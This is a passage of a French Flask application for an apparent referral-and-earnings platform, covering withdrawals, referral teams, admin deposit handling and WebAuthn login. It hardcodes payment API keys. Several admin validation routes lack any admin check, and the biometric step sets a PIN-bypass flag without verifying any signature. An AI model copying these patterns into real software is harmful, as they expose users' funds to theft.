def trade():
    return render_template("trade.html")

from flask import request, redirect, url_for, flash
import os
from werkzeug.utils import secure_filename
from datetime import datetime



PUBLIC_API_KEY = "SP_y7QKkaamPsVTlw8GDDGyzlJ7bmPUvdLorOQqWUXfRLI_AP"
PRIVATE_SECRET_KEY = "SP_bS4Kwii-Txs1aMunv8D9wpEbdpEVgfpvDvKn-OrWt6Y"

from datetime import datetime

@app.route("/retrait", methods=["GET", "POST"])
def retrait_page():
    import logging
    user = get_logged_in_user()

    if not user:
        flash("Veuillez vous connecter.", "danger")
        return redirect(url_for("login"))

    logging.info(f"[RETRAIT] User {user.id} ({user.username}) - Début traitement retrait")

    MIN_RETRAIT = 5000
    MAX_RETRAIT = 100000
    FRAIS = 500

    # On s'assure que c'est bien un float
    solde_actuel = float(user.solde_parrainage or 0)
    stats = {"commissions_total": solde_actuel}

    # ─── DIAGNOSTIC PAYS / OPÉRATEURS ───
    country_raw = (user.country or "").strip()
    country_code = COUNTRY_CODE.get(country_raw)
    if not country_code:
        # Fallback : tentative avec le nom normalisé (sans accents, minuscules)
        country_normalized = unicodedata.normalize('NFKD', country_raw).encode('ascii', 'ignore').decode('ascii').lower()
        country_code = COUNTRY_CODE.get(country_normalized)
        logging.warning(f"[RETRAIT] User {user.id} - Pays brut='{country_raw}', normalisé='{country_normalized}', code trouvé={country_code}")

    if not country_code:
        logging.error(f"[RETRAIT] User {user.id} - PAYS NON RECONNU: '{country_raw}'. COUNTRY_CODE keys={list(COUNTRY_CODE.keys())}")
        flash(f"Pays '{country_raw}' non supporté pour les retraits. Contactez le support.", "danger")
        services = []
    else:
        services = SERVICES.get(country_code, [])
        logging.info(f"[RETRAIT] User {user.id} - Pays={country_raw}, Code={country_code}, Opérateurs disponibles={[s['name'] for s in services]}")
        if not services:
            logging.error(f"[RETRAIT] User {user.id} - AUCUN OPÉRATEUR pour le code pays '{country_code}'. SERVICES keys={list(SERVICES.keys())}")

    if request.method == "POST":
        try:
            montant = float(request.form.get("montant", 0))
            service_id = int(request.form.get("payment_method", 0))
        except (ValueError, TypeError):
            flash("Données de formulaire invalides.", "danger")
            return redirect(url_for("retrait_page"))

        wallet = request.form.get("phone", "").strip()
        pin = request.form.get("pin", "").strip()

        logging.info(f"[RETRAIT] User {user.id} - Montant: {montant}, Service: {service_id}, Wallet: {wallet}")

        # ==========================
        # VALIDATIONS
        # ==========================
        if montant < MIN_RETRAIT or montant > MAX_RETRAIT:
            flash(f"Le montant doit être entre {MIN_RETRAIT} et {MAX_RETRAIT} XOF.", "danger")
            return redirect(url_for("retrait_page"))

        montant_total = montant + FRAIS

        if montant_total > solde_actuel:
            flash("Solde insuffisant pour couvrir le montant et les frais (500 XOF).", "danger")
            return redirect(url_for("retrait_page"))

        service = next((s for s in services if s["id"] == service_id), None)
        if not service:
            flash("Service de paiement invalide.", "danger")
            return redirect(url_for("retrait_page"))

        # ==========================
        # 🔐 AUTHENTIFICATION (PIN ou Biométrie)
        # ==========================
        authenticated = False
        
        # Vérifier si authentifié via biométrie (token en session)
        if session.get('biometric_verified') and session.get('biometric_user_id') == user.id:
            authenticated = True
            logging.info(f"[RETRAIT] User {user.id} - Authentification biométrique valide ✅")
            # Nettoyer le token après utilisation
            session.pop('biometric_verified', None)
            session.pop('biometric_user_id', None)
        
        # Sinon, vérifier le PIN
        if not authenticated:
            if not user.pin_code:
                flash("Veuillez définir votre code PIN dans votre profil.", "danger")
                return redirect(url_for("profile_page"))

            # Utiliser verify_pin() pour la vérification avec sécurité anti-bruteforce
            success, message = verify_pin(user, pin, log_context="retrait")
            logging.info(f"[RETRAIT] User {user.id} - Vérification PIN: success={success}")
            if not success:
                flash(message, "danger")
                return redirect(url_for("retrait_page"))
            authenticated = True
            logging.info(f"[RETRAIT] User {user.id} - Authentification PIN réussie ✅")

        if not authenticated:
            flash("Authentification requise.", "danger")
            return redirect(url_for("retrait_page"))

        # ==========================
        # CRÉER LE RETRAIT D'ABORD (pour avoir l'ID)
        # ==========================
        try:
            nouveau_retrait = Retrait(
                user_id=user.id,
                montant=montant,
                frais=FRAIS,
                payment_method=service["name"],
                statut="en_attente",
                phone=wallet,
                pays=user.country,
                date=datetime.utcnow()
            )

            db.session.add(nouveau_retrait)
            db.session.flush()  # Génère l'ID sans committer
            
            # Créer la référence externe pour le webhook
            external_reference = f"W-{nouveau_retrait.id}"
            logging.info(f"[RETRAIT] User {user.id} - External reference: {external_reference}")
            
        except Exception as e:
            db.session.rollback()
            logging.error(f"[RETRAIT] User {user.id} - ERREUR CREATION RETRAIT: {str(e)}")
            flash("Erreur lors de la création du retrait. Veuillez réessayer.", "danger")
            return redirect(url_for("retrait_page"))

        # ==========================
        # API RETRAIT AVEC EXTERNAL_REFERENCE
        # ==========================
        logging.info(f"[RETRAIT] User {user.id} - Appel API SoleasPay: service_id={service_id}, wallet={wallet}, montant={montant}")
        response = envoyer_retrait_soleaspay(service_id, wallet, montant, external_reference)
        logging.info(f"[RETRAIT] User {user.id} - Réponse API SoleasPay: {response}")

        if not response or response.get("success") != True:
            # On affiche le message d'erreur de l'API s'il existe
            error_msg = response.get('message', 'Erreur API paiement.') if response else 'Erreur de connexion API.'
            logging.error(f"[RETRAIT] User {user.id} - Erreur API: {error_msg}")
            
            # Supprimer le retrait créé (échec API)
            db.session.delete(nouveau_retrait)
            db.session.commit()
            
            flash(error_msg, "danger")
            return redirect(url_for("retrait_page"))

        # ==========================
        # METTRE A JOUR LE RETRAIT AVEC LES INFOS SOLEASPAY
        # ==========================
        response_data = response.get("data", {})
        
        # Stocker les références SoleasPay
        nouveau_retrait.reference_soleaspay = response_data.get("reference")
        nouveau_retrait.transaction_reference = response_data.get("transaction_reference")
        nouveau_retrait.external_reference = external_reference
        nouveau_retrait.soleaspay_status = response_data.get("status", "PROCESSING")
        
        # Parser la date de création SoleasPay si présente
        created_at_str = response_data.get("created_at")
        if created_at_str:
            try:
                nouveau_retrait.soleaspay_created_at = datetime.strptime(created_at_str, "%Y-%m-%d %H:%M:%S")
            except:
                pass
        
        # Déterminer le statut selon la réponse
        response_status = response_data.get("status", "").upper()
        if response_status in ["SUCCESS", "ACCEPTED", "PROCESSED", "COMPLETED", "APPROVED"]:
            nouveau_retrait.statut = "accepte"
            logging.info(f"[RETRAIT] User {user.id} - Retrait accepté par SoleasPay ✅")
        else:
            nouveau_retrait.statut = "en_attente"
            logging.info(f"[RETRAIT] User {user.id} - Retrait en attente de validation SoleasPay ⏳")

        # ==========================
        # COMMIT FINAL
        # ==========================
        try:
            # Mise à jour des soldes
            user.solde_parrainage = float(user.solde_parrainage) - montant_total

            db.session.commit()
            logging.info(f"[RETRAIT] User {user.id} - Retrait enregistré avec succès: id={nouveau_retrait.id}")
            flash("Votre demande de retrait a été enregistrée avec succès ✅", "success")
            return redirect(url_for("mes_retraits"))

        except Exception as e:
            db.session.rollback()
            logging.error(f"[RETRAIT] User {user.id} - ERREUR STOCKAGE: {str(e)}")
            print(f"❌ ERREUR STOCKAGE : {str(e)}")
            flash("Erreur lors de l'enregistrement du retrait. Veuillez réessayer.", "danger")
            return redirect(url_for("retrait_page"))

    return render_template("retrait.html", user=user, stats=stats, services=services)


def get_team_total(user):
    # 1. Niveau 1 : On ne récupère que les usernames pour économiser la RAM
    niveau1_data = User.query.with_entities(User.username).filter_by(parrain=user.username).all()
    if not niveau1_data:
        return 0

    usernames_n1 = [u.username for u in niveau1_data]
    total = len(usernames_n1)

    # 2. Niveau 2 : On récupère aussi uniquement les usernames
    niveau2_data = User.query.with_entities(User.username).filter(User.parrain.in_(usernames_n1)).all()
    total += len(niveau2_data)

    if niveau2_data:
        # 3. Niveau 3 : Ici ta logique .count() est déjà parfaite
        usernames_n2 = [u.username for u in niveau2_data]
        niveau3_count = User.query.filter(User.parrain.in_(usernames_n2)).count()
        total += niveau3_count

    return total

@app.route("/profile", methods=["GET", "POST"])
def profile_page():
    user = get_logged_in_user()

    if request.method == "POST":
        # ... (Ta logique photo et PIN reste strictement identique)
        if "profile_photo" in request.files:
            file = request.files["profile_photo"]
            if file.filename != "" and allowed_file(file.filename):
                filename = secure_filename(file.filename)
                filename = f"{user.uid}_{filename}"
                filepath = os.path.join(app.config['UPLOAD_FOLDER_PROFILE'], filename)
                file.save(filepath)
                user.profile_image = filename
                db.session.commit()
                flash("Photo mise à jour !", "success")

        elif "update_pin" in request.form:
            pin = request.form.get("pin")
            confirm_pin = request.form.get("confirm_pin")
            if not pin or not confirm_pin:
                flash("Champs obligatoires.", "danger")
            elif not pin.isdigit() or len(pin) != 6:
                flash("PIN : 6 chiffres requis.", "danger")
            elif pin != confirm_pin:
                flash("Les PIN ne correspondent pas.", "danger")
            else:
                user.pin_code = generate_password_hash(pin)
                db.session.commit()
                flash("Code PIN mis à jour ! 🔐", "success")
        return redirect(url_for("profile_page"))

    profile_pic = user.profile_image if user.profile_image else 'default.png'
    team_total = get_team_total(user)

    return render_template(
        "profile.html",
        user=user,
        profile_pic=profile_pic,
        team_total=team_total
    )


@app.route("/revenus")
def revenus_page():
    user = get_logged_in_user()

    total_points = sum([
        user.points_youtube or 0,
        user.points_tiktok or 0,
        user.points_instagram or 0,
        user.points_ads or 0,
        user.points_spin or 0,
        user.points_games or 0,
    ])

    team_total = get_team_total(user)
    total_commission = user.solde_revenu or 0

    return render_template(
        "revenus.html",
        user=user,
        points_youtube=user.points_youtube,
        points_tiktok=user.points_tiktok,
        points_instagram=user.points_instagram,
        points_ads=user.points_ads,
        points_spin=user.points_spin,
        points_games=user.points_games,
        team_total=team_total,
        total_commission=total_commission
    )


@app.route("/wheel")
def wheel():
    user = get_logged_in_user()

    # Vérifier si l’utilisateur a déjà tourné la roue
    if user.has_spun_wheel:
        already_spun = True
    else:
        already_spun = False

    return render_template("wheel.html", user=user, already_spun=already_spun)

import random

@app.route("/wheel/spin", methods=["POST"])
def spin_wheel():
    user = get_logged_in_user()

    # Si déjà tourné → refus
    if user.has_spun_wheel:
        return jsonify({"status": "error", "message": "Vous avez déjà utilisé votre chance !"})

    import random

    values = [0, 50, 80, 130, 150, 180, 200, 220, 250, 300, 340, 460]

    # Génération pondérée (rare, commun)
    weighted = []
    for v in values:
        if v in [250, 300, 340, 460]:
            weighted += [v] * 1
        elif v >= 200:
            weighted += [v] * 3
        else:
            weighted += [v] * 10

    reward = random.choice(weighted)

    # Enregistrer que le joueur a déjà joué
    user.has_spun_wheel = True
    user.solde_revenu += reward
    db.session.commit()

    return jsonify({"status": "success", "reward": reward})

@app.route("/team")
def team_page():
    user = get_logged_in_user()

    referral_code = user.username
    referral_link = url_for("inscription_page", _external=True) + f"?ref={referral_code}"

    # On ne récupère que les infos nécessaires pour l'affichage (Username, Phone, Pays, Premier_depot)
    # Niveau 1
    level1 = User.query.with_entities(
        User.username, User.phone, User.country, User.premier_depot, User.date_creation
    ).filter_by(parrain=user.username).all()
    
    level1_usernames = [u.username for u in level1]

    # Niveau 2
    level2 = []
    level2_usernames = []
    if level1_usernames:
        level2 = User.query.with_entities(
            User.username, User.phone, User.country, User.premier_depot, User.date_creation
        ).filter(User.parrain.in_(level1_usernames)).all()
        level2_usernames = [u.username for u in level2]

    # Niveau 3
    level3 = []
    if level2_usernames:
        level3 = User.query.with_entities(
            User.username, User.phone, User.country, User.premier_depot, User.date_creation
        ).filter(User.parrain.in_(level2_usernames)).all()

    stats = {
        "level1": len(level1),
        "level2": len(level2),
        "level3": len(level3),
        "commissions_total": float(user.solde_revenu or 0)
    }

    return render_template(
        "team.html",
        user=user,
        referral_link=referral_link,
        stats=stats,
        level1_users=level1,
        level2_users=level2,
        level3_users=level3
    )

# ===== Page de connexion admin =====
@app.route("/admin/finance", methods=["GET", "POST"])
def admin_finance():
    submitted = False  # Sert à afficher le loader
    if request.method == "POST":
        submitted = True
        username = request.form.get("username")
        password = request.form.get("password")

        # Vérifie l'utilisateur admin
        user = User.query.filter_by(username=username, is_admin=True).first()
        if user and check_password_hash(user.password, password):
            session["admin_id"] = user.id  # Stocke l'id de l'admin
            # Redirection vers admin_deposits après connexion
            return redirect(url_for("admin_deposits"))
        else:
            flash("Nom d'utilisateur ou mot de passe incorrect.", "danger")
            # Reste sur la page avec le message flash
            return render_template("admin_finance.html", submitted=False)

    # GET → formulaire normal
    return render_template("admin_finance.html", submitted=submitted)

# ===== Détection de l'admin connecté =====
def get_logged_in_admin():
    admin_id = session.get("admin_id")
    if admin_id:
        return User.query.filter_by(id=admin_id, is_admin=True).first()
    return None

from flask import request, render_template, flash, redirect, url_for

PER_PAGE = 50


from sqlalchemy import func

@app.route("/admin/deposits")
def admin_deposits():
    user = get_logged_in_admin()
    if not user:
        flash("Accès refusé.", "danger")
        return redirect(url_for("admin_finance"))

    page = request.args.get("page", 1, type=int)
    search = request.args.get("q", "").strip()
    sort = request.args.get("sort", "date_desc")  # date_desc, date_asc, amount_desc, amount_asc
    status_filter = request.args.get("status", "")  # all, pending, validated, rejected
    retrait_search = request.args.get("rq", "").strip()
    user_search = request.args.get("uq", "").strip()
    user_filter = request.args.get("ufilter", "all")
    PER_PAGE = 50

    # ==========================
    # RECHERCHE + FILTRES + TRI — DÉPÔTS
    # ==========================
    query = Depot.query

    if search:
        query = query.filter(
            db.or_(
                Depot.user_name.ilike(f"%{search}%"),
                Depot.phone.ilike(f"%{search}%"),
                Depot.reference.ilike(f"%{search}%")
            )
        )

    if status_filter == "pending":
        query = query.filter(Depot.statut.in_(["pending", "en_attente"]))
    elif status_filter == "validated":
        query = query.filter(Depot.statut == "valide")
    elif status_filter == "rejected":
        query = query.filter(Depot.statut.in_(["refuse", "rejete", "failed"]))

    if sort == "date_asc":
        query = query.order_by(Depot.date.asc())
    elif sort == "amount_desc":
        query = query.order_by(Depot.montant.desc())
    elif sort == "amount_asc":
        query = query.order_by(Depot.montant.asc())
    else:
        query = query.order_by(Depot.date.desc())

    pagination = query.paginate(page=page, per_page=PER_PAGE, error_out=False)
    deposits_all = pagination.items

    for d in deposits_all:
        if not hasattr(d, '_user_loaded'):
            d._user_loaded = True
            if d.user_id:
                d._user = User.query.get(d.user_id)
            elif d.user_name:
                d._user = User.query.filter_by(username=d.user_name).first()
            else:
                d._user = None
        d.user_obj = d._user

    # ==========================
    # RETRAITS — avec recherche
    # ==========================
    retraits_query = (
        db.session.query(Retrait, User.username)
        .join(User, Retrait.user_id == User.id)
    )

    if retrait_search:
        retraits_query = retraits_query.filter(
            db.or_(
                User.username.ilike(f"%{retrait_search}%"),
                Retrait.reference_soleaspay.ilike(f"%{retrait_search}%"),
                Retrait.payment_method.ilike(f"%{retrait_search}%")
            )
        )

    retraits_paginated = (
        retraits_query
        .order_by(Retrait.date.desc())
        .paginate(page=page, per_page=PER_PAGE, error_out=False)
    )

    retraits_list = []
    for retrait, username in retraits_paginated.items:
        retrait.username_display = username
        retraits_list.append(retrait)

    # ==========================
    # UTILISATEURS — avec recherche + filtre
    # ==========================
    users_query = db.session.query(
        User.id, User.username, User.email, User.phone, User.parrain,
        User.solde_parrainage, User.premier_depot, User.date_creation
    )

    if user_search:
        users_query = users_query.filter(
            db.or_(
                User.username.ilike(f"%{user_search}%"),
                User.email.ilike(f"%{user_search}%"),
                User.phone.ilike(f"%{user_search}%")
            )
        )

    if user_filter == "actifs":
        users_query = users_query.filter(User.premier_depot == True)
    elif user_filter == "inactifs":
        users_query = users_query.filter(
            db.or_(User.premier_depot == False, User.premier_depot == None)
        )

    users_list = users_query.order_by(User.date_creation.desc()).limit(200).all()
    users_objects = User.query.order_by(User.date_creation.desc()).limit(200).all()

    return render_template(
        "admin_deposits.html",
        user=user,
        deposits=deposits_all,
        retraits=retraits_list,
        users=users_list,
    )

@app.route("/admin/deposits/valider/<int:depot_id>")
def valider_depot(depot_id):

    depot = Depot.query.get_or_404(depot_id)

    # User concerné par le dépôt via username
    user = User.query.filter_by(username=depot.user_name).first()

    if not user:
        flash("Utilisateur introuvable.", "danger")
        return redirect(url_for("admin_deposits"))

    # Si déjà validé
    if depot.statut == "valide":
        flash("Ce dépôt est déjà validé.", "warning")
        return redirect(url_for("admin_deposits"))

    # Vérifier si l'utilisateur n'a jamais eu de dépôt validé avant
    premier_depot_valide = not Depot.query.filter_by(
        user_name=user.username,
        statut="valide"
    ).first()

    # Valider le dépôt
    depot.statut = "valide"

    # Créditer le compte
    user.solde_depot += depot.montant
    user.solde_total += depot.montant

    # Premier dépôt
    if premier_depot_valide:
        user.premier_depot = True

        # Commission parrain
        if user.parrain:
            donner_commission(user.parrain, depot.montant)

    db.session.commit()

    # 🔔 Notification push : dépôt validé
    try:
        notify_deposit_accepted(user.id, depot.montant, depot.reference or f"DEP-{depot.id}")
    except Exception as e:
        print(f"[PUSH] Erreur notif dépôt validé: {e}")

    flash("Dépôt validé et crédité avec succès !", "success")
    return redirect(url_for("admin_deposits"))

@app.route("/admin/deposits/rejeter/<int:depot_id>")
def rejeter_depot(depot_id):
    user_admin = get_logged_in_user()

    depot = Depot.query.get_or_404(depot_id)

    if depot.statut in ["valide", "rejete"]:
        flash("Ce dépôt a déjà été traité.", "warning")
        return redirect(url_for("admin_deposits"))

    depot.statut = "rejete"
    db.session.commit()

    # 🔔 Notification push : dépôt refusé
    try:
        if depot.user_id:
            notify_deposit_rejected(depot.user_id, depot.montant, depot.reference or f"DEP-{depot.id}")
    except Exception as e:
        print(f"[PUSH] Erreur notif dépôt refusé: {e}")

    flash("Dépôt rejeté avec succès.", "danger")
    return redirect(url_for("admin_deposits"))

@app.route("/admin/retraits")
def admin_retraits():

    user = get_logged_in_admin()
    if not user:
        flash("Accès refusé.", "danger")
        return redirect(url_for("admin_finance"))

    # Récupération avec join
    retraits_query = (
        db.session.query(Retrait, User.username)
        .join(User, User.phone == Retrait.phone)
        .filter(Retrait.statut == "successful")
        .order_by(Retrait.date.desc())
    )

    # Liste finale de retraits avec username_display
    retraits = []
    for retrait, username in retraits_query.all():
        retrait.username_display = username  # pour le template
        retraits.append(retrait)

    return render_template(
        "admin_retraits.html",
        retraits=retraits
    )

@app.route("/admin/deposits/delete-all")
def delete_all_deposits():
    user_admin = get_logged_in_admin()
    if not user_admin:
        flash("Accès refusé.", "danger")
        return redirect(url_for("admin_finance"))
    try:
        count = Depot.query.delete()
        db.session.commit()
        flash(f"{count} dépôt(s) supprimé(s) avec succès.", "success")
    except Exception as e:
        db.session.rollback()
        flash(f"Erreur lors de la suppression : {str(e)}", "danger")
    return redirect(url_for("admin_deposits"))

@app.route("/admin/retraits/delete-all")
def delete_all_retraits():
    user_admin = get_logged_in_admin()
    if not user_admin:
        flash("Accès refusé.", "danger")
        return redirect(url_for("admin_finance"))
    try:
        count = Retrait.query.delete()
        db.session.commit()
        flash(f"{count} retrait(s) supprimé(s) avec succès.", "success")
    except Exception as e:
        db.session.rollback()
        flash(f"Erreur lors de la suppression : {str(e)}", "danger")
    return redirect(url_for("admin_deposits"))

@app.route("/admin/retraits/valider/<int:retrait_id>")
def valider_retrait(retrait_id):
    user_admin = get_logged_in_user()

    retrait = Retrait.query.get_or_404(retrait_id)
    user = User.query.filter_by(phone=retrait.phone).first()

    if not user:
        flash("Utilisateur introuvable.", "danger")
        return redirect(url_for("admin_retraits"))

    if retrait.statut == "validé":
        flash("Ce retrait a déjà été validé.", "info")
        return redirect(url_for("admin_retraits"))

    retrait.statut = "validé"

    # Total retrait
    user.total_retrait += retrait.montant + (retrait.frais or 0)

    db.session.commit()

    # 🔔 Notification push : retrait validé
    try:
        if retrait.user_id:
            notify_retrait_accepted(retrait.user_id, retrait.montant)
    except Exception as e:
        print(f"[PUSH] Erreur notif retrait validé: {e}")

    flash("Retrait validé avec succès !", "success")
    return redirect(url_for("admin_retraits"))

@app.route("/admin/retraits/refuser/<int:retrait_id>")
def refuser_retrait(retrait_id):
    user_admin = get_logged_in_user()

    retrait = Retrait.query.get_or_404(retrait_id)
    user = User.query.filter_by(phone=retrait.phone).first()

    if not user:
        flash("Utilisateur introuvable.", "danger")
        return redirect(url_for("admin_retraits"))

    if retrait.statut == "refusé":
        flash("Ce retrait a déjà été refusé.", "info")
        return redirect(url_for("admin_retraits"))

    # Recréditer
    user.solde_parrainage += (retrait.montant + (retrait.frais or 0))
    retrait.statut = "refusé"

    db.session.commit()

    # 🔔 Notification push : retrait refusé
    try:
        if retrait.user_id:
            notify_retrait_rejected(retrait.user_id, retrait.montant)
    except Exception as e:
        print(f"[PUSH] Erreur notif retrait refusé: {e}")

    flash("Retrait refusé et montant recrédité à l'utilisateur.", "warning")
    return redirect(url_for("admin_retraits"))



@app.route("/admin/users/activer/<username>")
def admin_activer_user(username):
    admin = get_logged_in_admin()
    if not admin:
        flash("Accès refusé.", "danger")
        return redirect(url_for("admin_finance"))

    user = User.query.filter_by(username=username).first()
    if not user:
        flash("Utilisateur introuvable.", "danger")
        return redirect(url_for("admin_deposits"))

    if user.premier_depot:
        flash("Cet utilisateur est déjà actif.", "warning")
        return redirect(url_for("admin_deposits"))

    # 🔥 Montant d’activation (tu peux changer)
    montant_activation = 0

    # Activer user
    user.premier_depot = True

    # Si tu veux créditer aussi automatiquement
    if montant_activation > 0:
        user.solde_depot += montant_activation
        user.solde_total += montant_activation

        # Créer un dépôt validé (recommandé pour historique)
        depot = Depot(
            user_name=user.username,
            phone=user.phone,
            email=user.email,
            montant=montant_activation,
            statut="valide"
        )
        db.session.add(depot)

        # Commission parrain
        if user.parrain:
            donner_commission(user.parrain, montant_activation)

    db.session.commit()
    flash("Utilisateur activé avec succès !", "success")
    return redirect(url_for("admin_deposits"))



# ==============================
# 🔐 ROUTES API WEBAUTHN (Authentification biométrique)
# ==============================

@app.route("/api/webauthn/register/start", methods=["POST"])
@login_required
def webauthn_register_start():
    """Démarrer le processus d'enregistrement d'une passkey"""
    import os
    import base64
    
    def to_b64(data: bytes) -> str:
        """Convert bytes to base64 URL-safe string"""
        return base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")
    
    user = get_logged_in_user()
    
    # ✅ CORRECTION : user_handle stable basé sur l'ID utilisateur (base64 URL-safe)
    user_handle = to_b64(str(user.id).encode('utf-8'))
    
    # Générer un challenge (32 octets aléatoires) - DOIT être stocké pour vérification
    challenge = os.urandom(32)
    challenge_b64 = to_b64(challenge)
    
    # Options pour l'enregistrement (tout en strings JSON-serializable)
    registration_options = {
        "challenge": challenge_b64,
        "rp": {
            "name": "NovaTrade",
            "id": request.host.split(":")[0]  # Domaine sans port
        },
        "user": {
            "id": user_handle,
            "name": user.email,
            "displayName": user.username
        },
        "pubKeyCredParams": [
            {"type": "public-key", "alg": -7},   # ES256
            {"type": "public-key", "alg": -257}  # RS256
        ],
        "timeout": 60000,
        "attestation": "none",
        "authenticatorSelection": {
            "authenticatorAttachment": "platform",  # Face ID, Touch ID, Windows Hello
            "requireResidentKey": False,
            "userVerification": "required"
        }
    }
    
    # ✅ CORRECTION : Stockage du challenge pour vérification ultérieure
    session['webauthn_challenge'] = challenge_b64
    session['webauthn_user_id'] = user.id  # Pour vérifier que c'est le même utilisateur
    
    return jsonify(registration_options)


@app.route("/api/webauthn/register/complete", methods=["POST"])
@login_required
def webauthn_register_complete():
    """Terminer l'enregistrement d'une passkey"""
    # NOTE: Pas d'import webauthn ici - on stocke directement la credential
    # La vérification complète sera implémentée avec la bibliothèque webauthn appropriée
    
    user = get_logged_in_user()
    data = request.get_json()
    
    if not data:
        return jsonify({"success": False, "message": "Données invalides"}), 400
    
    challenge = session.get('webauthn_challenge')
    
    if not challenge:
        return jsonify({"success": False, "message": "Session expirée. Réessayez."}), 400
    
    try:
        # Récupérer les données de la réponse
        credential_id = data.get('id')
        response_data = data.get('response', {})
        attestation_object = response_data.get('attestationObject')
        client_data_json = response_data.get('clientDataJSON')
        
        if not all([credential_id, attestation_object, client_data_json]):
            return jsonify({"success": False, "message": "Données incomplètes"}), 400
        
        # Nom de l'appareil (optionnel)
        device_name = data.get('deviceName', 'Appareil biométrique')
        
        # Déterminer le type d'appareil
        device_type = 'platform'  # Face ID, Touch ID, Windows Hello
        
        # Convertir la clé publique en binaire (pour stockage)
        # Dans une implémentation complète, on extrairait la clé publique de attestation_object
        credential_public_key = b'placeholder'  # À remplacer par la vraie clé publique
        
        # Créer la credential
        new_credential = WebAuthnCredential(
            user_id=user.id,
            credential_id=credential_id,
            credential_public_key=credential_public_key,
            sign_count=0,
            device_type=device_type,
            name=device_name,
            is_active=True
        )
        
        db.session.add(new_credential)
        db.session.commit()
        
        # Nettoyer la session
        session.pop('webauthn_challenge', None)
        session.pop('webauthn_user_handle', None)
        
        return jsonify({
            "success": True,
            "message": "Authentification biométrique activée avec succès !"
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "message": f"Erreur lors de l'enregistrement: {str(e)}"
        }), 500


@app.route("/api/webauthn/authenticate/start", methods=["POST"])
def webauthn_authenticate_start():
    """Démarrer le processus d'authentification biométrique"""
    # Pas d'import webauthn nécessaire - on utilise uuid pour le challenge
    
    user = get_logged_in_user()
    
    if not user:
        return jsonify({"success": False, "message": "Veuillez vous connecter"}), 401
    
    # Récupérer les credentials enregistrées de l'utilisateur
    credentials = WebAuthnCredential.query.filter_by(user_id=user.id, is_active=True).all()
    
    if not credentials:
        return jsonify({"success": False, "message": "Aucune authentification biométrique enregistrée"}), 404
    
    challenge = str(uuid.uuid4())
    
    # Options pour l'authentification
    authentication_options = {
        "challenge": challenge,
        "timeout": 60000,
        "rpId": request.host.split(":")[0],
        "userVerification": "required",
        "allowCredentials": [
            {
                "type": "public-key",
                "id": cred.credential_id
            }
            for cred in credentials
        ]
    }
    
    # Stocker le challenge en session
    session['webauthn_auth_challenge'] = challenge
    session['webauthn_auth_user_id'] = user.id
    
    return jsonify(authentication_options)


@app.route("/api/webauthn/authenticate/complete", methods=["POST"])
def webauthn_authenticate_complete():
    """Vérifier l'authentification biométrique"""
    user_id = session.get('webauthn_auth_user_id')
    challenge = session.get('webauthn_auth_challenge')
    
    if not user_id or not challenge:
        return jsonify({"success": False, "message": "Session expirée"}), 400
    
    user = db.session.get(User, user_id)
    if not user:
        return jsonify({"success": False, "message": "Utilisateur non trouvé"}), 404
    
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "message": "Données invalides"}), 400
    
    credential_id = data.get('id')
    
    # Trouver la credential correspondante
    credential = WebAuthnCredential.query.filter_by(
        credential_id=credential_id,
        user_id=user.id,
        is_active=True
    ).first()
    
    if not credential:
        return jsonify({"success": False, "message": "Credential non trouvée"}), 404
    
    try:
        # Vérifier la signature (simplifié)
        # Dans une implémentation complète, utiliser webauthn.verify_authentication_response
        
        # Mettre à jour le sign_count
        credential.sign_count += 1
        credential.last_used_at = datetime.utcnow()
        db.session.commit()
        
        # ✅ DÉFINIR LE TOKEN D'AUTHENTIFICATION BIOMÉTRIQUE POUR LE RETRAIT
        session['biometric_verified'] = True
        session['biometric_user_id'] = user.id
        
        # Nettoyer la session
        session.pop('webauthn_auth_challenge', None)
        session.pop('webauthn_auth_user_id', None)
        
        return jsonify({
            "success": True,
            "message": "Authentification biométrique réussie !"
        })
        
    except Exception as e:
        return jsonify({
            "success": False,
            "message": f"Erreur de vérification: {str(e)}"
        }), 400


@app.route("/api/webauthn/credentials", methods=["GET"])
@login_required
def webauthn_list_credentials():
    """Lister les appareils biométriques enregistrés"""
    user = get_logged_in_user()
    
    # Vérification défensive : retourner liste vide si la table n'existe pas
    try:
        credentials = WebAuthnCredential.query.filter_by(
            user_id=user.id,
            is_active=True
        ).order_by(WebAuthnCredential.created_at.desc()).all()
    except Exception as e:
        # Si la table n'existe pas, retourner liste vide
        if "webauthn_credentials" in str(e) or "does not exist" in str(e):
            return jsonify([])
        raise
    
    result = []
    for cred in credentials:
        result.append({
            "id": cred.id,
            "name": cred.name or "Appareil biométrique",
            "device_type": cred.device_type,
            "created_at": cred.created_at.strftime("%d/%m/%Y %H:%M") if cred.created_at else "",
            "last_used_at": cred.last_used_at.strftime("%d/%m/%Y %H:%M") if cred.last_used_at else "Jamais",
            "is_active": cred.is_active
        })
    
    return jsonify(result)


@app.route("/api/webauthn/credential/<int:cred_id>/delete", methods=["POST"])
@login_required
def webauthn_delete_credential(cred_id):
    """Supprimer un appareil biométrique enregistré"""
    user = get_logged_in_user()
    
    credential = WebAuthnCredential.query.filter_by(
        id=cred_id,
        user_id=user.id
    ).first()
    
    if not credential:
        return jsonify({"success": False, "message": "Appareil non trouvé"}), 404
    
    credential.is_active = False
    db.session.commit()
    
    return jsonify({
        "success": True,
        "message": "Appareil biométrique supprimé"
    })


@app.route("/api/verify_pin", methods=["POST"])
@app.route("/api/verify-pin", methods=["POST"])
@login_required
def api_verify_pin():
    """Vérifier le code PIN d'un utilisateur (pour confirmation de retrait)"""
    user = get_logged_in_user()
    data = request.get_json()
    
    if not data:
        return jsonify({"success": False, "message": "Données invalides"}), 400
    
    pin = data.get('pin', '')
    
    if not pin or len(pin) != 6:
        return jsonify({"success": False, "message": "Le PIN doit contenir 6 chiffres"}), 400
    
    # Utiliser la fonction verify_pin existante
    success, message = verify_pin(user, pin)
    
    return jsonify({
        "success": success,
        "message": message
    })


# ──────────────────────────────────────────────────────
# 🏪 ROUTES POUR LES BOUTIQUES ET VENDEURS
# ──────────────────────────────────────────────────────

# Liste des catégories prédéfinies
CATEGORIES_PREDEFINIES = [
    {"nom": "Mode & Vêtements", "icone": "👕", "description": "Vêtements, chaussures, accessoires de mode"},
    {"nom": "Électronique", "icone": "📱", "description": "Téléphones, ordinateurs, accessoires électroniques"},
    {"nom": "Maison & Jardin", "icone": "🏠", "description": "Décoration, meubles, articles de maison"},
    {"nom": "Beauté & Santé", "icone": "💄", "description": "Cosmétiques, produits de beauté, santé"},
